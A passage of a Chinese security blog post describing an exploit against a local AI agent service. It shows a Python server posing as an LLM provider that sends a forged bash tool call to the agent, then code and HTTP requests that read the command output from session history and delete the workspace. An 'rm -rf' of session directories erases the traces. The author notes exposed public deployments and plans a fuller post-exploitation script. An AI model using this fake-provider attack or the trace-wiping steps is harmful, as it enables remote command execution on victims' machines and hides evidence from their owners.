+<span class="keyword">class</span> <span class="title class_">Handler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):
+    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):
+        n = <span class="built_in">int</span>(<span class="variable language_">self</span>.headers.get(<span class="string">&quot;content-length&quot;</span>, <span class="number">0</span>) <span class="keyword">or</span> <span class="number">0</span>)
+        body = json.loads(<span class="variable language_">self</span>.rfile.read(n) <span class="keyword">or</span> <span class="string">b&quot;&#123;&#125;&quot;</span>)
+        messages = body.get(<span class="string">&quot;messages&quot;</span>) <span class="keyword">or</span> []
+        last = messages[-<span class="number">1</span>] <span class="keyword">if</span> messages <span class="keyword">else</span> &#123;&#125;
+
+        <span class="keyword">if</span> last.get(<span class="string">&quot;role&quot;</span>) == <span class="string">&quot;tool&quot;</span>:
+            payload = sse_reply(text=<span class="string">&quot;ok&quot;</span>)
+        <span class="keyword">else</span>:
+            payload = sse_reply(tool_call=&#123;
+                <span class="string">&quot;id&quot;</span>: <span class="string">&quot;call_114514&quot;</span>,
+                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;bash&quot;</span>,
+                <span class="string">&quot;arguments&quot;</span>: json.dumps(&#123;
+                    <span class="string">&quot;command&quot;</span>: <span class="string">&quot;id&quot;</span>,
+                    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Show current user&quot;</span>,
+                &#125;),
+            &#125;)
+
+        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)
+        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/event-stream&quot;</span>)
+        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Length&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))
+        <span class="variable language_">self</span>.end_headers()
+        <span class="variable language_">self</span>.wfile.write(payload)
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    <span class="built_in">print</span>(<span class="string">&quot;[leak_tools] http://0.0.0.0:19999/v1&quot;</span>, flush=<span class="literal">True</span>)
+    ThreadingHTTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">19999</span>), Handler).serve_forever()</code></pre>
+<p>这里SSE流的通信写起来确实是麻烦啊，套的套子很多</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102221039564.png" alt="image-20261102221039564"></p>
+<p>这里就能拿到结果了</p>
+<p>依旧善意抓包</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102221543495.png" alt="image-20261102221543495"></p>
+<p>发现通过查看<code>session.history</code>的内容能获取到执行结果</p>
+<p>接着就是提取+删除</p>
+<p>这里拿到的json大概要这样取的(个人意见，取raw的那部分太慢了，取view更快，并且测试过没有截断)</p>
+<p><code>result[&quot;value&quot;][&quot;events&quot;]</code>里面遍历<code>view</code>找<code>view[&quot;for&quot;]</code>为result的</p>
+<p>然后取对应view:<code>view[&quot;view&quot;][&quot;output&quot;]</code></p>
+<p>大概像这样吧</p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span>
+          <span class="attr">&quot;event&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tool/result&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;seq&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span>
+            <span class="attr">&quot;time&quot;</span><span class="punctuation">:</span> <span class="number">1793630689287</span><span class="punctuation">,</span>
+            <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+              <span class="attr">&quot;turn&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>
+              <span class="attr">&quot;step&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>
+              <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+                <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tool&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;callId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_114514&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+                  <span class="punctuation">&#123;</span>
+                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tool-result&quot;</span><span class="punctuation">,</span>
+                    <span class="attr">&quot;toolCallId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_114514&quot;</span><span class="punctuation">,</span>
+                    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>
+                      <span class="punctuation">&#123;</span>
+                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span>
+                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uid=1000(node) gid=1000(node) groups=1000(node)\n&quot;</span>
+                      <span class="punctuation">&#125;</span>
+                    <span class="punctuation">]</span><span class="punctuation">,</span>
+                    <span class="attr">&quot;isError&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>
+                  <span class="punctuation">&#125;</span>
+                <span class="punctuation">]</span><span class="punctuation">,</span>
+                <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span>
+                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b28127d0-1579-4853-a583-8265965d2a61&quot;</span>
+              <span class="punctuation">&#125;</span>
+            <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;sourceEventSeqs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">19</span><span class="punctuation">]</span><span class="punctuation">,</span>
+            <span class="attr">&quot;surfaceOp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;append&quot;</span>
+          <span class="punctuation">&#125;</span><span class="punctuation">,</span>
+          <span class="attr">&quot;view&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+            <span class="attr">&quot;for&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span>
+            <span class="attr">&quot;view&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+              <span class="attr">&quot;card&quot;</span><span class="punctuation">:</span> <span class="string">&quot;terminal&quot;</span><span class="punctuation">,</span>
+              <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uid=1000(node) gid=1000(node) groups=1000(node)\n&quot;</span><span class="punctuation">,</span>
+              <span class="attr">&quot;exitCode&quot;</span><span class="punctuation">:</span> <span class="number">0</span>
+            <span class="punctuation">&#125;</span>
+          <span class="punctuation">&#125;</span>
+        <span class="punctuation">&#125;</span><span class="punctuation">,</span></code></pre>
+<p>接着就是删除会话准备跑路了(</p>
+<p>这个还是简单的</p>
+<pre><code class="highlight http">POST /api/workspace.delete
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;de2d192b-4b0c-485a-8772-84642e963f92&quot;,&quot;method&quot;:&quot;workspace.delete&quot;,&quot;payload&quot;:&#123;&quot;workspaceId&quot;:&quot;4bf321db-54eb-4881-b9a1-17cafcb97b77&quot;&#125;&#125;</code></pre>
+<p>可以的</p>
+<p>嗯?不对，真可以吗?</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102230221431.png" alt="image-20261102230221431"></p>
+<p>会发现变成这样子了，那么要怎么根除呢?归档删目录</p>
+<pre><code class="highlight plaintext">rm -rf $DSH_HOME/sessions/*/[sessionId]</code></pre>
+<p>这样就斩草除根了</p>
+<h2 id="碎碎念"><a class="markdownIt-Anchor" href="#碎碎念"></a> 碎碎念</h2>
+<p>看了Linux do上一些师傅的评价，感觉这个漏洞也是褒贬不一啊(贬偏多)</p>
+<p>qax当洞发了最后又&quot;紧急召回&quot;，有点难绷住</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144020956.png" alt="image-20261026144020956"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144123880.png" alt="image-20261026144123880"></p>
+<p>感觉是受众的问题吧，国内国模的受众还是比外国模型多太多了(小白也多很多)</p>
+<p>导致也出现了真的有人部署到公网的情况，9月份的时候扫一圈其实能看到很多(</p>
+<p>自己本地用的话其实感觉这个都不算什么漏洞，但是这种伪造LLM Provider的攻击思路是可以参考的</p>
+<p>AI发展越来越快，AI资产也越来越多，AI Sec也越来越重要了啊，有时候AI被打穿了直接污染一下AI就能拿到shell甚至可以本地提权。</p>
+<p>以后Windows提权Linux提权也许会有本地AI服务jail break提权呢()</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102232347378.png" alt="image-20261102232347378"></p>
+<p>相关的脚本后面我搓完了会发布在github上，考虑到要将其从一个裸利用的脚本改成一个比较完备，能进行后利用的脚本，可能会要点时间</p>
+<p>可能会有人要问为什么不直接把想法告诉AI，让AI搓一个脚本呢?答案其实一开始就说了呢(笑</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/AI/" rel="tag"># AI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/26/WordPress-RCE-Series-1/" rel="prev" title="WordPress-RCE-Series-1">
+                  <i class="fa fa-angle-left"></i> WordPress-RCE-Series-1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">471k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">14:16</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
